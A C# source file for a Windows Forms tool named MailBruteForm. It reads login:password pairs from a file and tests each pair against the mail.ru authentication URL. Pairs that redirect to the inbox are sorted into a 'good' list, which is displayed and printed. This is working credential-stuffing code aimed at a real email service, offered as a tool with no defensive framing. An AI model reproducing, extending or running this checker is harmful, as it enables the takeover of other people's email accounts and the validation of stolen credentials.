using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace MailBruteForm
{
    public class Checker
    {

        public string mailru = @"https://auth.mail.ru/cgi-bin/auth?Login={0}&Password={1}";
        public List<string> accountsList = new List<string>();
        public List<string> goodList = new List<string>();
        public List<string> badList = new List<string>();
        public int countSource = 0;
        public int countGood = 0;
        public int countBad = 0;
        public int counterAcc = -1;


        private MailBruteForm _frmMain;
        public Checker(MailBruteForm frmMain)
        {
            _frmMain = frmMain;
        }


        public void fillAccountsList(string path)
        {
            string line;
            System.IO.StreamReader file = new System.IO.StreamReader(path);
            while ((line = file.ReadLine()) != null)
            {
                accountsList.Add(line);
                countSource++;
            }
            _frmMain.setLblCountAcc(countSource);
            file.Close();
        }


        public bool checkMail(string account)
        {

            bool chk = false;

            string[] splitacc = account.Split(':');


            string url = String.Format(mailru, splitacc[0], splitacc[1]);

            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
            if (response.ResponseUri.ToString() == "https://e.mail.ru/login")
            {
                goodList.Add(splitacc[0] + ":" + splitacc[1]);
                chk = true;
                countGood++;
                _frmMain.setLblGood(countGood);
                _frmMain.setListBox(splitacc[0] + ":" + splitacc[1]);
            }
            else
            {
                _frmMain.setLblBad(countBad);
                badList.Add(splitacc[0] + ":" + splitacc[1]);
                countBad++;
            }
            response.Close();



            return chk;
        }


        public void showResult()
        {
            Console.WriteLine("Good: " + countGood);
            Console.WriteLine("\nBad: " + countBad);

            Console.WriteLine("\n\nGOOD ACCOUNTS:\n");
            for (int i = 0; i < goodList.Count; i++)
            {
                Console.WriteLine(goodList[i] + "\n");
            }
        }

    }
}
